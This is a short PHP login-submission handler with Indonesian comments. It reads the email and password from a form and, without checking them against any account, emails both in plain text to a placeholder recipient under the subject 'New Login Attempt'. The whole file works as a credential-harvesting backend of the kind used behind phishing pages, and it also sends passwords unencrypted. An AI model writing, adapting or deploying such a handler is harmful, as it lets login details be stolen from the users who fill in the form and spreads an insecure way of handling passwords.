<?php
// submit-login.php

// Ambil data dari form
$email = $_POST['email'];
$password = $_POST['password'];

// Validasi data (contoh sederhana)
if (filter_var($email, FILTER_VALIDATE_EMAIL) && !empty($password)) {
    // Biasanya, di sini kamu akan memproses data login (misalnya, memeriksa ke database)
    // Namun, untuk contoh ini, kita hanya mengirim email

    $to = "your-email@example.com"; // Ganti dengan email penerima
    $subject = "New Login Attempt";
    $message = "Email: $email\nPassword: $password";
    $headers = "From: no-reply@example.com";

    // Kirim email
    if (mail($to, $subject, $message, $headers)) {
        echo "Login details sent successfully.";
    } else {
        echo "Failed to send login details.";
    }
} else {
    echo "Invalid email or password.";
}
?>
